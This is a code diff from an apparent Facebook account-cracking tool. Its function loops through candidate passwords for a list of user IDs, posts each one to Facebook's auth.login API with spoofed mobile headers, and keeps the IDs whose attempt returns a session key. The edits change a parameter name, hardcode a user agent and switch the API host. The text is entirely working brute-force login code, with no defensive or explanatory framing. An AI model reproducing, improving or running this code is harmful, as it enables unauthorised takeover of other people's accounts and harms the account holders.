@@ -436,14 +436,14 @@ def _M2_(ids,pasx):
         except Exception as e:
                pass
 #━━━━━━━━━━━━━[MATHOD━X━M3]━━━━━━━━━━━━━━━━#
-def _M3_(ids,pasb):
+def _M3_(ids,pasx):
         global loop
         global ok
         global agents
         sys.stdout.write(f'\r\r\033[38;5;48m{G}[BITHIKA-M2] {GR}{loop}\033[38;5;48m|OK➤\033[38;5;46m{len(ok)}')
         sys.stdout.flush()
         try:
-                for ps in pasb:
+                for ps in pasx:
                         session = requests.Session()
                         user_agent=userag1()
                         data={
@@ -464,7 +464,7 @@ def _M3_(ids,pasb):
                         'fb_api_req_friendly_name': 'authenticate'}
 
                         head={
-                        'User-Agent': user_agent, 
+                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4361.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;', 
                         'Accept-Encoding': 'gzip, deflate', 
                         'Accept': '*/*', 
                         'Connection': 'keep-alive', 
@@ -477,7 +477,7 @@ def _M3_(ids,pasb):
                         'Content-Type': 'application/x-www-form-urlencoded',
                         'X-FB-HTTP-Engine': 'Liger'}
 
-                        url1="https://b-api.facebook.com/method/auth.login"
+                        url1="https://api.facebook.com/method/auth.login"
                         BLACK=session.post(url1,data=data, headers=head).json()
                         if 'session_key' in BLACK:
                                 uid = BLACK["uid"]
